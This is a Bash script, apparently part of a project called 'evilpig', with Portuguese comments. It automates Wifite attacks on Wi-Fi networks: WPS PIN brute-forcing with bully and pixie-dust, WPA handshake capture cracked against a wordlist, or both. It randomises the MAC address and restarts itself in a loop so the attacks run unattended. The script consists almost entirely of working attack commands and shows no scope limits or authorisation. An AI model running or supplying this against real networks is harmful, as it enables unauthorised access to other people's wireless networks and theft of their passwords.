#!/bin/bash

# Função para iniciar a sessão do tmux
start_session() {
    # Verifica o parâmetro e executa os comandos apropriados
    case $1 in
        1)
            # Nome da sessão
            SESSION_NAME="evilpig-wifi-wps"

            tmux new-session -d -s $SESSION_NAME

            # Muda para o diretório do Wifite
            tmux send-keys -t $SESSION_NAME "cd /opt/evilpig/wifite3" C-m

            # Apenas ataque WPS
            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i wlx0036765525cc --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 5 --wps-fails 5 -p 20 > /opt/evilpig/wifite3/wifite.log && exit" C-m
            ;;
        2)
            # Nome da sessão
            SESSION_NAME="evilpig-wifi-wpa"

            tmux new-session -d -s $SESSION_NAME

            # Muda para o diretório do Wifite
            tmux send-keys -t $SESSION_NAME "cd /opt/evilpig/wifite3" C-m

            # Apenas ataque WPA
            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i wlx0036765525cc --random-mac --no-wps --clients-only -v --dict /opt/evilpig/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 20 > /opt/evilpig/wifite3/wifite.log && exit" C-m
            ;;
        3)
            # Nome da sessão
            SESSION_NAME="evilpig-wifi-mix"

            tmux new-session -d -s $SESSION_NAME

            # Muda para o diretório do Wifite
            tmux send-keys -t $SESSION_NAME "cd /opt/evilpig/wifite3" C-m

            # Ataques WPS e WPA
            tmux send-keys -t $SESSION_NAME "python3 Wifite.py -i wlx0036765525cc --random-mac -v --bully --pixie --wps-only --wps --wps-time 60 --wps-timeouts 5 --wps-fails 5 -p 20 > /opt/evilpig/wifite3/wifite.log && python3 Wifite.py -i wlx0036765525cc --random-mac --no-wps --clients-only -v --dict /opt/evilpig/wifite3/wordlist-top4800-probable.txt --wpat 60 --wpadt 7 -p 20 >> /opt/evilpig/wifite3/wifite.log && exit" C-m
            ;;
        *)
            echo "Parâmetro inválido. Use 1 para WPS, 2 para WPA ou 3 para ambos."
            exit 1
            ;;
    esac
}

# Verifica se um parâmetro foi passado
if [ $# -eq 0 ]; then
    echo "Uso: $0 [1|2|3]"
    exit 1
fi

# Iniciar a sessão com o parâmetro fornecido
start_session $1

# Loop para monitorar a sessão
while true; do
    # Verifica se a sessão ainda está ativa
    if ! tmux has-session -t $SESSION_NAME 2>/dev/null; then
        echo "A sessão '$SESSION_NAME' foi encerrada. Reiniciando..."
        start_session $1
    fi
    
    # Aguarda um tempo antes de verificar novamente
    sleep 5
done